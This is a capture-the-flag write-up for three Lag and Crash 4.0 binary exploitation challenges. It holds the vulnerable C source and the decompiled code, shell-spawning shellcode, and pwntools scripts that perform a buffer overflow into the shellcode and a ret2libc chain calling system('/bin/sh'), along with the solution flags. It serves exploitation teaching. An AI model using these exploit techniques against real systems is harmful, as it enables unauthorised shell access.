# Binary exploitation challenges in Lag and Crash 4.0
- [Welcome2Pwn!](#Welcome2Pwn)
- [CtfChallengeHub](#CtfChallengeHub)
- [InversXin](#InversXin)

-----

## Welcome2Pwn

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/0c8d631b-5a6d-4ee0-bc3e-f702c6b10d5a)

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

char stuff[0x100];
char * code;

void shellz(void) {
    printf("Here's your shell!\n");
    memcpy(code, stuff, 0x100); 
    typedef void (*func_t)(void);
    ((func_t)code)();
}

int main(void) {
    char buf[0x100];
    
    // Ignore this
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    code = mmap(NULL, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    
    printf("Welcome to pwn!\n");
    printf("Show me a cool exploit technique!\n");
    printf(">> ");
    fgets(stuff, 0x100, stdin);
    printf("Now tell me where to go: \n");
    printf(">> "); 
    fgets(buf, 0x200, stdin);
    return 0;
}
```

Simple buffer overflow to return to `shellz` function after loading shellcode into `stuff`. I got the shellcode for shell from [shell-storm](https://shell-storm.org/shellcode/files/shellcode-905.html). Once I got shell in the server, I navigated around the directory and used `cat ../flag && ls` to print the flag.

Solve script:

```py
from pwn import *

r = remote('chal1.lagncra.sh',  8405)

r.recvuntil(b'>> ')
shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
r.sendline(shellcode)
r.recvuntil(b'>> ')

shellz = p64(0x0000000000401166)

offset = 264
payload = b'A' * offset + shellz

r.sendline(payload)
r.interactive()
```

Flag: `LNC24{C0MPU73R_G0_brRrRRrRRRRRRrrRrRRRrRrRrRRrRRrRRRRRrRrR}`

-----

## CtfChallengeHub

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/b0c9938f-a678-4e9b-9499-cdd226cce8c2)

Since source code was not given, I used ghidra to disassemble to get the code:

```c
void pwnchall(void)
{
  sleep(1);
  puts("Error. File pwn_chall.exe was not found.");
  return;
}

void forenchall(void)
{
  sleep(1);
  puts("Error. File memdump.bin was not found.");
  return;
}

void miscchall(void)
{
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined4 local_18;
  
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  printf("Enter cmd:\n> ");
  fgets((char *)&local_78,0x100,stdin);
  if ((char)local_78 == '\0') {
    puts("Popen called.\nNULL command has been executed. Result: NULL");
  }
  else {
    puts("Command is blacklisted!");
  }
  return;
}

void revchall(void)
{
  printf("MD5 Hash: %s\n","a04a4032507eb242254a087f723d0a72");
  puts("The flag has this MD5 hash with salt \'wakuefharkushvSERvgsdfvgSF\'");
  return;
}

void cryptochall(void)
{
  printf("AES_ECB encrypted ciphertext: %s\n",
         "44476c380d5d45d358d06146472163e258b837b08ce26d253a4620e860768f8afb3badbf902ad695a4d8ff012e3386c2"
        );
  return;
}

undefined8 main(void)
{
  char local_418 [1032];
  int local_10;
  int local_c;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("Welcome to my challenge hub! Beat one of my challenges to get the flag!");
  puts("Choose a challenge:");
  for (local_c = 0; local_c < 5; local_c = local_c + 1) {
    printf("%d. %s\n",(ulong)(local_c + 1),*(undefined8 *)(challs + (long)local_c * 8));
  }
  printf("> ");
  fgets(local_418,1000,stdin);
  local_10 = atoi(local_418);
  if (local_10 == 1) {
    puts("Pwn this exe!");
    pwnchall();
  }
  else if (local_10 == 2) {
    puts("Reverse this well known hashing function!");
    revchall();
  }
  else if (local_10 == 5) {
    puts("Break this well known cipher with a single-known ciphertext attack!");
    cryptochall();
  }
  else if (local_10 == 4) {
    puts("Find the flag in this memdump!");
    forenchall();
  }
  else if (local_10 == 3) {
    puts("Get the flag in this linux jail!");
    miscchall();
  }
  else {
    puts("Invalid value!");
  }
  return 0;
}
```

Only the miscchall function is useful as there is a buffer overflow with offset 120

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/54b45021-8efe-434e-b7b5-731cd0b91f8b)

This is standard ret2libc and they kindly gave us the libc file also :)

Setup the script file:

```py
from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

elf = ELF('./chall')
libc = ELF('./libc.so.6')
context.binary = elf

r = remote('chal1.lagncra.sh', 8401)
r.recvuntil(b'> ')
r.sendline(b'3')
r.recvuntil(b'> ')
```

First part of the attack to get the libc base address using the puts function (used ropper to get the ret and poprdi addresses):

```py
# get libc address
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')

payload = b'A' * offset
payload += rop.chain()

r.sendline(payload)
r.recvuntil(b'\n')

puts = u64(r.recv(6).ljust(8, b'\x00'))
print(f'puts: {hex(puts)}')

ret = p64(0x000000000040101a)
poprdi = p64(0x00000000004011de)

# calculate libc base
libc.address = puts - libc.symbols['puts']
print(f'libc base: {hex(libc.address)}')
```

Second part of the attack to get shell (which I then used `cat ../flag && ls` to print the flag):

```py
# get shell
r.recvuntil(b'> ')
r.sendline(b'3')
r.recvuntil(b'> ')

rop = ROP(libc)
rop.call('system', [next(libc.search(b'/bin/sh\x00'))])

payload = b'A' * offset
payload += ret
payload += rop.chain()
payload += ret

print(f'payload: {payload}')

r.sendline(payload)
r.interactive()
```

Flag: `LNC24{reT2l1bC_iSNt_tH4t_hARd_aFt3r_aLLL}`

-----

## InversXin

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/0e3923da-6f24-4f49-9eaa-8778efbf5de8)

I was playing around with the server and tried to overflow the buffers which gave the flag which is in reverse.

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/5ac0c4e2-d5d5-44aa-b86a-559367f80d64)

Need to mirror reverse this:

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/c853b979-ff3d-4052-bc44-10817c791a9f)

Flag: `LNC24{R!3v@3r5#eDU$See?%}`
